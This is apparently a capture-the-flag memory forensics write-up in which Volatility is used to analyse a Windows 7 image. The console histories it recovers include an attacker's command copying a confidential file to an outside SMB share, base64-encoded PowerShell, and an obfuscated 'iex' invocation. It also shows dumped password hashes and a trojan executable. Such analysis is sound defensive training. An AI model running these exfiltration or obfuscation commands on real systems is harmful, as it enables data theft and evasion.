```bash
$ .\volatility_2.6_win64_standalone.exe -f ..\..\Sherlocks\recollection.bin imageinfo

Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (D:\HTB\Sherlocks\recollection.bin)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80002a3f120L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80002a41000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2022-12-19 16:07:30 UTC+0000
     Image local date and time : 2022-12-19 22:07:30 +0600
```
OS: Win7SP1x64, Win7SP0x64

```bash
 $ .\volatility_2.6_win64_standalone.exe -f ..\..\Sherlocks\recollection.bin --profile=Win7SP1x64 clipboard
 
 Volatility Foundation Volatility Framework 2.6
Session    WindowStation Format                         Handle Object             Data

---------- ------------- ------------------ ------------------ ------------------ --------------------------------------------------
         1 WinSta0       CF_UNICODETEXT               0x6b010d 0xfffff900c1bef100 (gv '*MDR*').naMe[3,11,2]-joIN''

         1 WinSta0       CF_TEXT                  0x7400000000 ------------------

         1 WinSta0       CF_LOCALE                    0x7d02bd 0xfffff900c209a260

         1 WinSta0       0x0L                              0x0 ------------------
```
(gv '*MDR*').naMe[3,11,2]-joIN''

```bash
 $ .\volatility_2.6_win64_standalone.exe -f ..\..\Sherlocks\recollection.bin --profile=Win7SP1x64 consoles
 
Volatility Foundation Volatility Framework 2.6
**************************************************
ConsoleProcess: conhost.exe Pid: 3524
Console: 0xff9d6200 CommandHistorySize: 50
HistoryBufferCount: 3 HistoryBufferMax: 4
OriginalTitle: %SystemRoot%\system32\cmd.exe
Title: C:\Windows\system32\cmd.exe - powershell
AttachedProcess: powershell.exe Pid: 3532 Handle: 0xdc
AttachedProcess: cmd.exe Pid: 4052 Handle: 0x60
----
CommandHistory: 0xc2c50 Application: powershell.exe Flags:
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0xbef50 Application: powershell.exe Flags: Allocated, Reset
CommandCount: 6 LastAdded: 5 LastDisplayed: 5
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0xdc
Cmd #0 at 0xc71c0: type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt
Cmd #1 at 0xbf230: powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
Cmd #2 at 0x9d1a0: powershell.exe -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
Cmd #3 at 0xc72a0: cd .\Downloads
Cmd #4 at 0xbdf10: ls
Cmd #5 at 0xc2ee0: .\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
----
CommandHistory: 0xbebe0 Application: cmd.exe Flags: Allocated, Reset
CommandCount: 2 LastAdded: 1 LastDisplayed: 1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x60
Cmd #0 at 0xc2f80: powershell -command "(gv '*MDR*').naMe[3,11,2]-joIN''"
Cmd #1 at 0xbd660: powershell
----
Screen 0xa10c0 X:80 Y:300
Dump:
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\user>powershell -command "(gv '*MDR*').naMe[3,11,2]-joIN''"
iex

C:\Users\user>powershell
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\Users\user> type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171
\pulice\pass.txt
The network path was not found.
At line:1 char:47
+ type C:\Users\Public\Secret\Confidential.txt > <<<<  \\192.168.0.171\pulice\p
ass.txt
    + CategoryInfo          : OpenError: (:) [], IOException
    + FullyQualifiedErrorId : FileOpenFailure

PS C:\Users\user> powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1x
QdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
The term '??????????????????????????????' is not recognized as the name of a cm
dlet, function, script file, or operable program. Check the spelling of the nam
e, or if a path was included, verify that the path is correct and try again.
At line:1 char:31
+ ?????????????????????????????? <<<<
    + CategoryInfo          : ObjectNotFound: (??????????????????????????????:
   String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

PS C:\Users\user> powershell.exe -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2V
yc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
The term '??????????????????????????????' is not recognized as the name of a cm
dlet, function, script file, or operable program. Check the spelling of the nam
e, or if a path was included, verify that the path is correct and try again.
At line:1 char:31
+ ?????????????????????????????? <<<<
    + CategoryInfo          : ObjectNotFound: (??????????????????????????????:
   String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

PS C:\Users\user> cd .\Downloads
PS C:\Users\user\Downloads> ls


    Directory: C:\Users\user\Downloads


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-----        12/19/2022   2:59 PM     420864 b0ad704122d9cffddd57ec92991a1e99fc
                                             1ac02d5b4d8fd31720978c02635cb1.exe
-a---        12/19/2022   9:00 PM     313152 b0ad704122d9cffddd57ec92991a1e99fc
                                             1ac02d5b4d8fd31720978c02635cb1.zip
-a---        12/19/2022   9:00 PM     205646 bf9e9366489541153d0e2cd21bdae11591
                                             f6be48407f896b75e1320628346b03.zip
-a---        12/19/2022   3:00 PM     309248 csrsss.exe
-a---        12/17/2022   4:16 PM    5885952 wazuh-agent-4.3.10-1.msi


PS C:\Users\user\Downloads> .\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd317
20978c02635cb1.exe
PS C:\Users\user\Downloads>
**************************************************
ConsoleProcess: conhost.exe Pid: 2312
Console: 0xff9d6200 CommandHistorySize: 50
HistoryBufferCount: 4 HistoryBufferMax: 4
OriginalTitle: Windows PowerShell
Title: Windows PowerShell
AttachedProcess: powershell.exe Pid: 3688 Handle: 0x60
----
CommandHistory: 0x1be7b0 Application: powershell.exe Flags:
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0x1be500 Application: net1.exe Flags:
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0xddaf0 Application: net.exe Flags:
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0x1bdab0 Application: powershell.exe Flags: Allocated, Reset
CommandCount: 5 LastAdded: 4 LastDisplayed: 4
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x60
Cmd #0 at 0xd7980: gv '*MDR*').naMe[3,11,2]-joIN''
Cmd #1 at 0xd79d0: (gv '*MDR*').naMe[3,11,2]-joIN''
Cmd #2 at 0x1bc560: net users
Cmd #3 at 0x1be6e0: powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
Cmd #4 at 0xd7a20: (gv '*MDR*').naMe[3,11,2]-joIN''
----
Screen 0xe18a0 X:120 Y:3000
Dump:
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\Users\user> gv '*MDR*').naMe[3,11,2]-joIN''
Unexpected token ')' in expression or statement.
At line:1 char:12
+ gv '*MDR*') <<<< .naMe[3,11,2]-joIN''
    + CategoryInfo          : ParserError: ():String) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : UnexpectedToken

PS C:\Users\user> (gv '*MDR*').naMe[3,11,2]-joIN''
iex
PS C:\Users\user> net users

User accounts for \\USER-PC

-------------------------------------------------------------------------------
Administrator            Guest                    user
The command completed successfully.

PS C:\Users\user> powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
The term '??????????????????????????????' is not recognized as the name of a cmdlet, function, script file, or operable
 program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:31
+ ?????????????????????????????? <<<<
    + CategoryInfo          : ObjectNotFound: (??????????????????????????????:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

PS C:\Users\user> (gv '*MDR*').naMe[3,11,2]-joIN''
iex
PS C:\Users\user>
```
iex: **Invoke-Expression**
type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt

powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1x
QdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"

```bash
$ echo ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi | base64 -d

echo "hacked by mafia" > "C:\Users\Public\Office\readme.txt"
```

## hive list
```bash
$ .\volatility_2.6_win64_standalone.exe -f ..\..\Sherlocks\recollection.bin --profile=Win7SP1x64 hivelist

Volatility Foundation Volatility Framework 2.6
Virtual            Physical           Name
------------------ ------------------ ----
0xfffff8a004266010 0x000000009a90f010 \Device\HarddiskVolume1\Boot\BCD
.........
.........
0xfffff8a000024010 0x00000000a96fa010 \REGISTRY\MACHINE\SYSTEM
.........
.........
0xfffff8a00257e010 0x0000000106fd2010 \??\C:\System Volume Information\Syscache.hve
```
## Dump registry keys
```bash
$ .\volatility_2.6_win64_standalone.exe -f ..\..\Sherlocks\recollection.bin --profile=Win7SP1x64 printkey -o 0xfffff8a000024010

Volatility Foundation Volatility Framework 2.6
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \REGISTRY\MACHINE\SYSTEM
Key name: CMI-CreateHive{2A7FB991-7BBE-4F9D-B91E-7CB51D4737F5} (S)
Last updated: 2022-12-19 15:32:19 UTC+0000

Subkeys:
  (S) ControlSet001
  (S) ControlSet002
  (S) MountedDevices
  (S) RNG
  (S) Select
  (S) Setup
  (S) Software
  (S) WPA
  (V) CurrentControlSet

$ .\volatility_2.6_win64_standalone.exe -f ..\..\Sherlocks\recollection.bin --profile=Win7SP1x64 printkey -o 0xfffff8a000024010 -K 'ControlSet001\Control\ComputerName\ComputerName'

Volatility Foundation Volatility Framework 2.6
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \REGISTRY\MACHINE\SYSTEM
Key name: ComputerName (S)
Last updated: 2022-12-10 23:48:28 UTC+0000

Subkeys:

Values:
REG_SZ                        : (S) mnmsrvc
REG_SZ        ComputerName    : (S) USER-PC
```
## Hashdump
```bash
.\volatility_2.6_win64_standalone.exe -f ..\..\Sherlocks\recollection.bin --profile=Win7SP1x64 hashdump

Volatility Foundation Volatility Framework 2.6
Administrator:500:aad3b435b51404eeaad3b435b51404ee:10eca58175d4228ece151e287086e824:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1001:aad3b435b51404eeaad3b435b51404ee:5915a7959c04d8560468296edaefbc9b:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:cb6003ecf6b98b5f7fbbb03df798ac76:::
```
## filescan
```bash
$ .\volatility_2.6_win64_standalone.exe -f ..\..\Sherlocks\recollection.bin --profile=Win7SP1x64 filescan | findstr password

Volatility Foundation Volatility Framework 2.6
0x000000011fc10070      1      0 R--rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt
```

```bash
$ .\volatility_2.6_win64_standalone.exe -f ..\..\Sherlocks\recollection.bin --profile=Win7SP1x64 filescan | findstr b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1
Volatility Foundation Volatility Framework 2.6

0x000000011ee95460     12      0 R--rw- \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.zip
0x000000011fa45c20     16      0 -W-r-- \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
0x000000011fc1db70      2      0 R--r-d \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
```

```bash
# dump-dir=save, I want to save the file in save folder.
$ .\volatility_2.6_win64_standalone.exe -f ..\..\Sherlocks\recollection.bin --profile=Win7SP1x64 dumpfiles -n --dump-dir=save -Q 0x000000011fa45c20

$ dir save\


    Directory: D:\HTB\Tools\volatility_2.6_win64_standalone\save


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        20/02/2024   7:16 pm         421888 file.None.0xfffffa8003b62990.b0ad704122d9cffddd57ec92991a1e99fc1ac02d
                                                  5b4d8fd31720978c02635cb1.exe.dat
-a----        20/02/2024   7:16 pm         409088 file.None.0xfffffa8003b7a880.b0ad704122d9cffddd57ec92991a1e99fc1ac02d
                                                  5b4d8fd31720978c02635cb1.exe.img
```
## Upload these two files to [Virustotal](https://www.virustotal.com/gui/home/search)

The files will be deleted, so I need to use Linux
```bash
$ ./volatility_2.6_lin64_standalone -f ../sherlocks/recollection.bin --profile=Win7SP1x64 dumpfiles -n --dump-dir=save -Q 0x000000011fa45c20
```
![[Pasted image 20240220194950.png]]Trojan/Win32.Sabsik
![[Pasted image 20240220195051.png]]Imphash: d3b592cd9481e4f053b5362e22d61595
![[Pasted image 20240220195149.png]]
Creation Time: 2022-06-22 11:49:04 UTC

```bash
$ ./volatility_2.6_lin64_standalone -f ../sherlocks/recollection.bin --profile=Win7SP1x64 netscan

Volatility Foundation Volatility Framework 2.6
Offset(P)          Proto    Local Address                  Foreign Address      State            Pid      Owner          Created
.....
.....
0x11e3b2bf0        UDPv4    192.168.0.104:138              *:*                                   4        System         2022-12-19 15:32:47 UTC+0000
0x11e3b40e0        UDPv4    192.168.0.104:137              *:*                                   4        System         2022-12-19 15:32:47 ......
......
0x11e0101c0        TCPv4    192.168.0.104:139              0.0.0.0:0            LISTENING        4        System        
```
192.168.0.104

```bash
$ ./volatility_2.6_lin64_standalone -f ../sherlocks/recollection.bin --profile=Win7SP1x64 pstree 
```
![[Pasted image 20240220195838.png]]
There are two powershell sessions. The first one comes from cmd.exe, which is suspicious. The second one comes from explorer.exe, which is normal.

```bash
$ strings -el ../sherlocks/recollection.bin | grep -i mail
```
![[Pasted image 20240220200349.png]]
`$ ./volatility_2.6_lin64_standalone -f ../sherlocks/recollection.bin --profile=Win7SP1x64 filescan | grep -i history
`
![[Pasted image 20240220200622.png]]
```bash
$ ./volatility_2.6_lin64_standalone -f ../sherlocks/recollection.bin --profile=Win7SP1x64 dumpfiles -n --dump-dir=save -Q 0x000000011e0d16f0

$ open save/file.None.0xfffffa80056d1440.History.dat
```
![[Pasted image 20240220201417.png]]wazuh 

```bash
$ ./volatility_2.6_lin64_standalone -f ../sherlocks/recollection.bin --profile=Win7SP1x64 filescan | grep -i download
```
![[Pasted image 20240220201747.png]]
csrsss.exe
real name is csrss.exe
![[Pasted image 20240220201917.png]]